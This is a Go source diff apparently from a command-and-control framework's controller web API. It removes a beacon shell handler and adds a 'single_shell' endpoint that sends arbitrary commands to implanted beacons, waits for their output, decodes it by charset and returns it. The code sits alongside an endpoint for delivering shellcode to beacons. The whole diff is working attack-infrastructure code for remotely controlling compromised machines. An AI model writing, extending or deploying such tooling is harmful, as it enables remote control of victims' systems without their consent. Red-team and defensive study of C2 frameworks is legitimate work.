@@ -14,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/axgle/mahonia"
 	"github.com/gorilla/csrf"
 	"github.com/gorilla/sessions"
 	"github.com/gorilla/websocket"
@@ -110,8 +111,8 @@ func newWeb(ctx *Ctrl, config *Config) (*web, error) {
 	router.POST("/api/load_key", wh.handleLoadKey)
 	router.POST("/api/node/trust", wh.handleTrustNode)
 	router.POST("/api/node/connect", wh.handleConnectNodeListener)
-	router.POST("/api/beacon/shell", wh.handleShell)
 	router.POST("/api/beacon/shellcode", wh.handleShellcode)
+	router.POST("/api/beacon/single_shell", wh.handleSingleShell)
 
 	// configure HTTPS server
 	listener, err := net.Listen(cfg.Network, cfg.Address)
@@ -274,37 +275,6 @@ func (wh *webHandler) handleConnectNodeListener(w hRW, r *hR, p hP) {
 	_, _ = w.Write([]byte("connect node listener successfully"))
 }
 
-func (wh *webHandler) handleShell(w hRW, r *hR, p hP) {
-	_ = r.ParseForm()
-	beaconGUID := guid.GUID{}
-
-	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
-	if err != nil {
-		fmt.Println("1", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-
-	err = beaconGUID.Write(beaconGUIDSlice)
-	if err != nil {
-		fmt.Println("2", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-
-	shell := messages.Shell{
-		Command: r.FormValue("cmd"),
-	}
-
-	err = wh.ctx.sender.SendToBeacon(context.Background(),
-		&beaconGUID, messages.CMDBShell, &shell, true)
-	if err != nil {
-		fmt.Println("2", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-}
-
 func (wh *webHandler) handleShellcode(w hRW, r *hR, p hP) {
 	_ = r.ParseForm()
 	beaconGUID := guid.GUID{}
@@ -337,5 +307,48 @@ func (wh *webHandler) handleShellcode(w hRW, r *hR, p hP) {
 		fmt.Println("4", err)
 		_, _ = w.Write([]byte(err.Error()))
 		return
+	}
+}
+
+func (wh *webHandler) handleSingleShell(w hRW, r *hR, p hP) {
+	_ = r.ParseForm()
+	beaconGUID := guid.GUID{}
+
+	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
+	if err != nil {
+		fmt.Println("1", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+
+	err = beaconGUID.Write(beaconGUIDSlice)
+	if err != nil {
+		fmt.Println("2", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+
+	shell := messages.SingleShell{
+		Command: r.FormValue("cmd"),
+	}
+
+	reply, err := wh.ctx.SendToBeaconRT(context.Background(),
+		&beaconGUID, messages.CMDBSingleShell, &shell, true)
+	if err != nil {
+		fmt.Println("2", err)
+		_, _ = w.Write([]byte(err.Error()))
+		return
+	}
+
+	decoderName := r.FormValue("decoder")
+	decoder := mahonia.NewDecoder(decoderName)
+	if decoder == nil {
+		_, _ = w.Write([]byte("invalid decoder: " + decoderName))
+		return
+	}
+	output := reply.(*messages.SingleShellOutput)
+	_, _ = w.Write([]byte(decoder.ConvertString(string(output.Output))))
+	if output.Err != "" {
+		_, _ = w.Write([]byte(decoder.ConvertString(string(output.Err))))
 	}
 }
